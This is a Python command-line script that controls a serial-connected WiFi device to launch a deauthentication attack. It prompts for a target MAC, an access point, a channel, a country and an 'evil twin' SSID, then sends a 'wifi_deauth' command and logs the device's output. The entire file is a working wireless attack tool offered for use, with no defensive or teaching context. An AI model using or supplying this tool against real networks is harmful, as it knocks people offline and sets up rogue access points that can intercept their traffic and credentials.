import click
import json
from utils import connect_serial


@click.command()
@click.argument('target', default="FF-FF-FF-FF-FF-FF") # Setup your default Macs here
@click.argument('ap', default="") # Setup your default Macs here
@click.argument("ssid", default="None") # Setup your default Evil SSID here
@click.argument('chan', default=11) # Setup your default Chan here
@click.argument('delay', default=1000) # Setup your default delay here
def main(target, ap, chan, ssid, delay):
	try:
		targetInput = input(
			"[?] Select a target (default '%s'): " % target)
		if targetInput != "":
			target = targetInput
	except KeyboardInterrupt:
		print("\n[+] Exiting...")
		exit()

	try:
		apInput = input("[?] Select an AP (default '%s'): " % ap)
		if apInput != "":
			ap = apInput
	except KeyboardInterrupt:
		print("\n[+] Exiting...")
		exit()

	try:
		delayInput = input("[?] Select delay (default '%s'): " % delay)
		if delayInput != "":
			delay = int(delayInput)
	except KeyboardInterrupt:
		print("\n[+] Exiting...")
		exit()

	apInput = apInput.upper().replace(":", "-").replace(" ", "-")
	targetInput = targetInput.upper().replace(":", "-").replace(" ", "-")

	country = "FR"
	try:
		countryInput = input("[?] Select a country (default '%s'): " % country)
		if countryInput != "":
			country = countryInput
	except KeyboardInterrupt:
		print("\n[+] Exiting...")
		exit()

	try:
		chanInput = input("[?] Select a channel (default '%d'): " % chan)
		if chanInput != "":
			chan = int(chanInput)
	except KeyboardInterrupt:
		print("\n[+] Exiting...")
		exit()

	try:
		ssidInput = input("[?] Select a twin ssid (default '%s'): " % ssid)
		ssid = ssidInput
	except KeyboardInterrupt:
		print("\n[+] Exiting...")
		exit()

	ser, filename = connect_serial(timeout=1)

	f = open(filename, 'wb')

	# set country
	ser.write(("set country %s\r\n" % country).encode())
	ln = ser.read_until(b"\r\n").decode("utf-8")
	try:
		if (ln == None or len(ln) == 0):
			print("Empty country setting, exiting...")
			exit()
		try:
			j = json.loads(ln)
			recv_country = j.get("WIFI_COUNTRY")
			if recv_country != country:
				print("Error 1 setting country, exiting...")
				exit()
		except:
			print("Error 2 setting country, exiting...")
			exit()
	except:
		print("Error 3 setting country, exiting...")
		exit()	
		
	# set channel
	ser.write(("set chan %d\r\n" % (chan)).encode())
	ln = ser.read_until(b"\r\n").decode("utf-8")
	try:
		if (ln == None or len(ln) == 0):
			print("Empty channel setting, exiting...")
			exit()
		try:
			j = json.loads(ln)
			recv_chan = j.get("WIFI_CHANNEL")
			if recv_chan != chan:
				print("Error 1 setting channel, exiting...")
				exit()
		except:
			print("Error 2 setting channel, exiting...")
			exit()
	except:
		print("Error 3 setting channel, exiting...")
		exit()
		
	ser.write(("wifi_deauth %s %s %s %d 1\r\n" % (target, ap, ssid, delay)).encode())
	print("[+] Deauther started...")

	try:
		while True:
			ln = ser.read_until(b"<STOP>")
			f.write(ln.replace(b"<STOP>", b""))
			f.flush()
	except KeyboardInterrupt:
		ser.write("stop\r\n".encode())
		print("[+] Stopping...")

	f.close()
	ser.close()
	print("[+] Done.")


if __name__ == "__main__":
    main()
